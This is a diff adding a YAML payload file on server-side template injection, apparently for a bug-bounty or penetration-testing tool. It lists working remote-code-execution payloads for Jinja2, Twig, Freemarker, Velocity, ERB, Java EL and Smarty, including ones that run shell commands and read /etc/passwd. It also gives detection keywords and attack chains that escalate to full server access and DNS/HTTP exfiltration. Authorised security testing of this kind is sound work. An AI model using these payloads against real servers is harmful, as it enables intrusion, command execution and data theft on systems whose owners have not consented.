@@ -1,0 +1,110 @@
+name: Server-Side Template Injection (SSTI)
+description: >
+  SSTI occurs when user input is embedded directly into template expressions
+  without proper sanitization, allowing attackers to execute arbitrary code
+  on the server.
+
+basic_payloads:
+  - "{{7*7}}"
+  - "{{7*'7'}}"
+  - "#{7*7}"
+  - "${7*7}"
+  - "<%= 7*7 %>"
+  - "{{ config }}"
+  - "{{ self }}"
+  - "{{ _self }}"
+  - "{{7*7}}"
+  - "*{{7*7}}"
+  - "{{ ''.__class__.__mro__ }}"
+
+bypass_techniques:
+  - name: Jinja2 RCE
+    description: Escalate Jinja2 SSTI to full RCE
+    payloads:
+      - "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
+      - "{{ ''.__class__.__mro__[1].__subclasses__() }}"
+      - "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+      - "{{ lipsum.__globals__['os'].popen('id').read() }}"
+
+  - name: Twig RCE
+    description: Escalate Twig SSTI to RCE
+    payloads:
+      - "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}"
+      - "{{ ['id']|filter('system') }}"
+      - "{{ {'id': 'id'}|map({'id': 'system'})|join }}"
+
+  - name: Freemarker RCE (Java)
+    description: Escalate Freemarker SSTI to RCE
+    payloads:
+      - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+      - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}"
+
+  - name: Velocity RCE (Java)
+    description: Escalate Apache Velocity SSTI to RCE
+    payloads:
+      - "#set($e=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))"
+      - "#set($str=$class.inspect('java.lang.String'))"
+      - "$e.waitFor()"
+
+  - name: ERB RCE (Ruby)
+    description: Escalate Ruby ERB SSTI to RCE
+    payloads:
+      - "<%= system('id') %>"
+      - "<%= `id` %>"
+      - "<%= File.read('/etc/passwd') %>"
+      - "<%= IO.popen('id').read() %>"
+
+  - name: Expression Language (EL) RCE
+    description: Escalate Java EL injection to RCE
+    payloads:
+      - "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}"
+      - "${request.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}"
+
+  - name: Smarty RCE (PHP)
+    description: Escalate PHP Smarty SSTI to RCE
+    payloads:
+      - "{system('id')}"
+      - "{php}echo shell_exec('id');{/php}"
+      - "{$smarty.version}"
+
+detection_patterns:
+  - "ssti"
+  - "template injection"
+  - "server-side template injection"
+  - "{{"
+  - "{%"
+  - "#{"
+  - "${"
+  - "<%="
+  - "jinja"
+  - "twig"
+  - "freemarker"
+  - "smarty"
+  - "velocity"
+
+chain_templates:
+  - name: SSTI -> RCE -> Full Server Access
+    description: Escalate template injection to RCE and gain server access
+    requirements: [ssti, template_engine_identified]
+    steps:
+      - Confirm SSTI with benign math payload
+      - Identify template engine (Jinja2/Twig/Freemarker/etc.)
+      - Use engine-specific RCE payload
+      - Execute commands to gain access
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: Blind SSTI -> Out-of-Band RCE
+    description: Exploit blind template injection via out-of-band callbacks
+    requirements: [blind_ssti, outbound_connectivity]
+    steps:
+      - Confirm blind SSTI via time delay
+      - Use out-of-band payload to detect callback
+      - Escalate to command execution
+      - Exfiltrate data via DNS/HTTP
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+h1_references:
+  - report_id: "XXXXX"
+    title: "SSTI in email template"
+    technique: "Jinja2 SSTI to RCE"
+    severity: "critical"
